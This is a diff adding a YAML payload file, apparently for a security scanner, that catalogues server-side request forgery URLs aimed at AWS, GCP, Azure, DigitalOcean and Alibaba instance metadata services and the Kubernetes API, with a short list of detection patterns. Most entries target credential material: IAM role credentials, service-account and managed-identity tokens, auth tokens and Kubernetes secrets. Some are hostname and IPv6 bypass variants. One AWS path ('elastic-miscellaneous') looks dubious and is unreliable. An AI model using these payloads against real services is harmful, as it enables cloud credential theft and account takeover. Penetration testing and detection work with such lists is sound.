@@ -1,0 +1,454 @@
+metadata:
+  type: ssrf/cloud
+  version: "1.0"
+  description: "Cloud metadata SSRF payloads"
+  sources: ["OWASP", "PayloadsAllTheThings", "HackTricks"]
+
+detection_patterns:
+  - "(?i)ami-id"
+  - "(?i)instance-id"
+  - "(?i)metadata.*?compute"
+  - "(?i)169\\.254\\.169\\.254"
+  - "(?i)instance-identity"
+
+payloads:
+  aws:
+    - value: "http://169.254.169.254/latest/meta-data/"
+      description: "AWS metadata root"
+      severity: critical
+      tags: [aws, metadata]
+
+    - value: "http://169.254.169.254/latest/meta-data/ami-id"
+      description: "AWS AMI ID"
+      severity: critical
+      tags: [aws, metadata]
+
+    - value: "http://169.254.169.254/latest/meta-data/instance-id"
+      description: "AWS instance ID"
+      severity: critical
+      tags: [aws, metadata]
+
+    - value: "http://169.254.169.254/latest/meta-data/instance-type"
+      description: "AWS instance type"
+      severity: high
+      tags: [aws, metadata]
+
+    - value: "http://169.254.169.254/latest/meta-data/hostname"
+      description: "AWS hostname"
+      severity: high
+      tags: [aws, metadata]
+
+    - value: "http://169.254.169.254/latest/meta-data/local-hostname"
+      description: "AWS local hostname"
+      severity: high
+      tags: [aws, metadata]
+
+    - value: "http://169.254.169.254/latest/meta-data/local-ipv4"
+      description: "AWS local IPv4"
+      severity: high
+      tags: [aws, metadata]
+
+    - value: "http://169.254.169.254/latest/meta-data/public-hostname"
+      description: "AWS public hostname"
+      severity: high
+      tags: [aws, metadata]
+
+    - value: "http://169.254.169.254/latest/meta-data/public-ipv4"
+      description: "AWS public IPv4"
+      severity: high
+      tags: [aws, metadata]
+
+    - value: "http://169.254.169.254/latest/meta-data/security-groups"
+      description: "AWS security groups"
+      severity: high
+      tags: [aws, metadata]
+
+    - value: "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+      description: "AWS IAM security credentials"
+      severity: critical
+      tags: [aws, iam]
+
+    - value: "http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-default-ssm"
+      description: "AWS IAM EC2 credentials"
+      severity: critical
+      tags: [aws, iam]
+
+    - value: "http://169.254.169.254/latest/meta-data/network/interfaces/macs/"
+      description: "AWS network interfaces"
+      severity: high
+      tags: [aws, metadata]
+
+    - value: "http://169.254.169.254/latest/user-data/"
+      description: "AWS user data"
+      severity: critical
+      tags: [aws, user_data]
+
+    - value: "http://169.254.169.254/latest/dynamic/instance-identity/document"
+      description: "AWS instance identity"
+      severity: high
+      tags: [aws, metadata]
+
+    - value: "http://169.254.169.254/latest/meta-data/placement/availability-zone"
+      description: "AWS availability zone"
+      severity: medium
+      tags: [aws, metadata]
+
+    - value: "http://169.254.169.254/latest/meta-data/block-device-mapping/"
+      description: "AWS block device mapping"
+      severity: medium
+      tags: [aws, metadata]
+
+    - value: "http://169.254.169.254/latest/meta-data/elastic-miscellaneous/"
+      description: "AWS elastic IPs"
+      severity: medium
+      tags: [aws, metadata]
+
+    - value: "http://instance-data/latest/meta-data/"
+      description: "AWS instance-data hostname"
+      severity: critical
+      tags: [aws, metadata, bypass]
+
+    - value: "http://[fd00:ec2::254]/latest/meta-data/"
+      description: "AWS IPv6 metadata"
+      severity: critical
+      tags: [aws, metadata, ipv6]
+
+    - value: "http://169.254.169.254/latest/meta-data/services/domain"
+      description: "AWS service domain"
+      severity: medium
+      tags: [aws, metadata]
+
+    - value: "http://169.254.169.254/latest/meta-data/metrics/"
+      description: "AWS metrics"
+      severity: medium
+      tags: [aws, metadata]
+
+  gcp:
+    - value: "http://169.254.169.254/computeMetadata/v1/"
+      description: "GCP metadata root"
+      severity: critical
+      tags: [gcp, metadata]
+
+    - value: "http://169.254.169.254/computeMetadata/v1/project/"
+      description: "GCP project metadata"
+      severity: critical
+      tags: [gcp, metadata]
+
+    - value: "http://169.254.169.254/computeMetadata/v1/project/project-id"
+      description: "GCP project ID"
+      severity: critical
+      tags: [gcp, metadata]
+
+    - value: "http://169.254.169.254/computeMetadata/v1/project/numeric-project-id"
+      description: "GCP numeric project ID"
+      severity: high
+      tags: [gcp, metadata]
+
+    - value: "http://169.254.169.254/computeMetadata/v1/instance/"
+      description: "GCP instance metadata"
+      severity: critical
+      tags: [gcp, metadata]
+
+    - value: "http://169.254.169.254/computeMetadata/v1/instance/hostname"
+      description: "GCP instance hostname"
+      severity: high
+      tags: [gcp, metadata]
+
+    - value: "http://169.254.169.254/computeMetadata/v1/instance/zone"
+      description: "GCP instance zone"
+      severity: high
+      tags: [gcp, metadata]
+
+    - value: "http://169.254.169.254/computeMetadata/v1/instance/name"
+      description: "GCP instance name"
+      severity: high
+      tags: [gcp, metadata]
+
+    - value: "http://169.254.169.254/computeMetadata/v1/instance/id"
+      description: "GCP instance ID"
+      severity: high
+      tags: [gcp, metadata]
+
+    - value: "http://169.254.169.254/computeMetadata/v1/instance/machine-type"
+      description: "GCP machine type"
+      severity: high
+      tags: [gcp, metadata]
+
+    - value: "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/"
+      description: "GCP service accounts"
+      severity: critical
+      tags: [gcp, iam]
+
+    - value: "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token"
+      description: "GCP default service account token"
+      severity: critical
+      tags: [gcp, iam, token]
+
+    - value: "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/email"
+      description: "GCP service account email"
+      severity: high
+      tags: [gcp, iam]
+
+    - value: "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/aliases"
+      description: "GCP service account aliases"
+      severity: high
+      tags: [gcp, iam]
+
+    - value: "http://169.254.169.254/computeMetadata/v1/instance/attributes/"
+      description: "GCP instance attributes"
+      severity: high
+      tags: [gcp, metadata]
+
+    - value: "http://169.254.169.254/computeMetadata/v1/instance/network-interfaces/"
+      description: "GCP network interfaces"
+      severity: high
+      tags: [gcp, metadata]
+
+    - value: "http://metadata.google.internal/computeMetadata/v1/"
+      description: "GCP metadata internal hostname"
+      severity: critical
+      tags: [gcp, metadata, bypass]
+
+    - value: "http://metadata.google.internal/computeMetadata/v1/project/project-id"
+      description: "GCP internal hostname project"
+      severity: critical
+      tags: [gcp, metadata, bypass]
+
+    - value: "http://169.254.169.254/computeMetadata/v1beta1/"
+      description: "GCP beta metadata"
+      severity: high
+      tags: [gcp, metadata]
+
+    - value: "http://metadata/computeMetadata/v1/"
+      description: "GCP short hostname"
+      severity: critical
+      tags: [gcp, metadata, bypass]
+
+  azure:
+    - value: "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
+      description: "Azure instance metadata"
+      severity: critical
+      tags: [azure, metadata]
+
+    - value: "http://169.254.169.254/metadata/instance?api-version=2021-02-01&format=json"
+      description: "Azure instance metadata JSON"
+      severity: critical
+      tags: [azure, metadata]
+
+    - value: "http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01"
+      description: "Azure compute metadata"
+      severity: critical
+      tags: [azure, metadata]
+
+    - value: "http://169.254.169.254/metadata/instance/compute/name?api-version=2021-02-01&format=text"
+      description: "Azure instance name"
+      severity: high
+      tags: [azure, metadata]
+
+    - value: "http://169.254.169.254/metadata/instance/compute/resourceGroupName?api-version=2021-02-01&format=text"
+      description: "Azure resource group"
+      severity: high
+      tags: [azure, metadata]
+
+    - value: "http://169.254.169.254/metadata/instance/compute/subscriptionId?api-version=2021-02-01&format=text"
+      description: "Azure subscription ID"
+      severity: high
+      tags: [azure, metadata]
+
+    - value: "http://169.254.169.254/metadata/instance/compute/vmId?api-version=2021-02-01&format=text"
+      description: "Azure VM ID"
+      severity: high
+      tags: [azure, metadata]
+
+    - value: "http://169.254.169.254/metadata/instance/compute/vmSize?api-version=2021-02-01&format=text"
+      description: "Azure VM size"
+      severity: medium
+      tags: [azure, metadata]
+
+    - value: "http://169.254.169.254/metadata/instance/compute/location?api-version=2021-02-01&format=text"
+      description: "Azure location"
+      severity: medium
+      tags: [azure, metadata]
+
+    - value: "http://169.254.169.254/metadata/instance/compute/osType?api-version=2021-02-01&format=text"
+      description: "Azure OS type"
+      severity: medium
+      tags: [azure, metadata]
+
+    - value: "http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2021-02-01&format=text"
+      description: "Azure public IP"
+      severity: high
+      tags: [azure, metadata, network]
+
+    - value: "http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/privateIpAddress?api-version=2021-02-01&format=text"
+      description: "Azure private IP"
+      severity: high
+      tags: [azure, metadata, network]
+
+    - value: "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
+      description: "Azure managed identity token"
+      severity: critical
+      tags: [azure, iam, token]
+
+    - value: "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net/"
+      description: "Azure Key Vault token"
+      severity: critical
+      tags: [azure, iam, token]
+
+    - value: "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://storage.azure.com/"
+      description: "Azure Storage token"
+      severity: critical
+      tags: [azure, iam, token]
+
+    - value: "http://169.254.169.254/metadata/app?api-version=2021-02-01"
+      description: "Azure App Service metadata"
+      severity: critical
+      tags: [azure, metadata, app_service]
+
+  digitalocean:
+    - value: "http://169.254.169.254/metadata/v1/"
+      description: "DigitalOcean metadata root"
+      severity: critical
+      tags: [digitalocean, metadata]
+
+    - value: "http://169.254.169.254/metadata/v1/instance-id"
+      description: "DigitalOcean instance ID"
+      severity: high
+      tags: [digitalocean, metadata]
+
+    - value: "http://169.254.169.254/metadata/v1/region"
+      description: "DigitalOcean region"
+      severity: medium
+      tags: [digitalocean, metadata]
+
+    - value: "http://169.254.169.254/metadata/v1/hostname"
+      description: "DigitalOcean hostname"
+      severity: high
+      tags: [digitalocean, metadata]
+
+    - value: "http://169.254.169.254/metadata/v1/interfaces/public/0/ipv4/address"
+      description: "DigitalOcean public IP"
+      severity: high
+      tags: [digitalocean, metadata]
+
+    - value: "http://169.254.169.254/metadata/v1/user-data"
+      description: "DigitalOcean user data"
+      severity: critical
+      tags: [digitalocean, user_data]
+
+    - value: "http://169.254.169.254/metadata/v1/droplet_id"
+      description: "DigitalOcean droplet ID"
+      severity: high
+      tags: [digitalocean, metadata]
+
+    - value: "http://169.254.169.254/metadata/v1/auth-token"
+      description: "DigitalOcean auth token"
+      severity: critical
+      tags: [digitalocean, iam, token]
+
+  alibaba:
+    - value: "http://100.100.100.200/latest/meta-data/"
+      description: "Alibaba Cloud metadata root"
+      severity: critical
+      tags: [alibaba, metadata]
+
+    - value: "http://100.100.100.200/latest/meta-data/instance-id"
+      description: "Alibaba instance ID"
+      severity: high
+      tags: [alibaba, metadata]
+
+    - value: "http://100.100.100.200/latest/meta-data/instance-type"
+      description: "Alibaba instance type"
+      severity: medium
+      tags: [alibaba, metadata]
+
+    - value: "http://100.100.100.200/latest/meta-data/region-id"
+      description: "Alibaba region"
+      severity: medium
+      tags: [alibaba, metadata]
+
+    - value: "http://100.100.100.200/latest/meta-data/eipAddress"
+      description: "Alibaba EIP"
+      severity: high
+      tags: [alibaba, metadata]
+
+    - value: "http://100.100.100.200/latest/meta-data/ram/security-credentials/"
+      description: "Alibaba RAM credentials"
+      severity: critical
+      tags: [alibaba, iam]
+
+    - value: "http://100.100.100.200/latest/meta-data/private-ipv4"
+      description: "Alibaba private IP"
+      severity: high
+      tags: [alibaba, metadata]
+
+    - value: "http://100.100.100.200/latest/meta-data/mac"
+      description: "Alibaba MAC address"
+      severity: medium
+      tags: [alibaba, metadata]
+
+    - value: "http://100.100.100.200/latest/user-data/"
+      description: "Alibaba user data"
+      severity: critical
+      tags: [alibaba, user_data]
+
+  kubernetes:
+    - value: "https://kubernetes.default.svc/"
+      description: "Kubernetes API server"
+      severity: critical
+      tags: [kubernetes, api]
+
+    - value: "https://kubernetes.default.svc/api/v1/namespaces"
+      description: "Kubernetes namespaces"
+      severity: critical
+      tags: [kubernetes, api]
+
+    - value: "https://kubernetes.default.svc/api/v1/secrets"
+      description: "Kubernetes secrets"
+      severity: critical
+      tags: [kubernetes, api, secrets]
+
+    - value: "https://kubernetes.default.svc/api/v1/namespaces/default/secrets"
+      description: "Kubernetes default namespace secrets"
+      severity: critical
+      tags: [kubernetes, api, secrets]
+
+    - value: "https://kubernetes.default.svc/api/v1/namespaces/kube-system/secrets"
+      description: "Kubernetes kube-system secrets"
+      severity: critical
+      tags: [kubernetes, api, secrets]
+
+    - value: "https://kubernetes.default.svc/api/v1/configmaps"
+      description: "Kubernetes configmaps"
+      severity: high
+      tags: [kubernetes, api]
+
+    - value: "https://kubernetes.default.svc/api/v1/pods"
+      description: "Kubernetes pods"
+      severity: high
+      tags: [kubernetes, api]
+
+    - value: "https://kubernetes.default.svc/api/v1/services"
+      description: "Kubernetes services"
+      severity: high
+      tags: [kubernetes, api]
+
+    - value: "https://kubernetes.default.svc/api/v1/namespaces/default/pods"
+      description: "Kubernetes default pods"
+      severity: high
+      tags: [kubernetes, api]
+
+    - value: "https://kubernetes.default.svc/version"
+      description: "Kubernetes version"
+      severity: high
+      tags: [kubernetes, api]
+
+    - value: "http://169.254.169.254/computeMetadata/v1/"
+      description: "GKE metadata (Kubernetes on GCP)"
+      severity: critical
+      tags: [kubernetes, gcp, metadata]
+
+    - value: "https://kubernetes.default.svc/api/v1/namespaces/default/serviceaccounts/default"
+      description: "Kubernetes service account"
+      severity: high
+      tags: [kubernetes, api, iam]
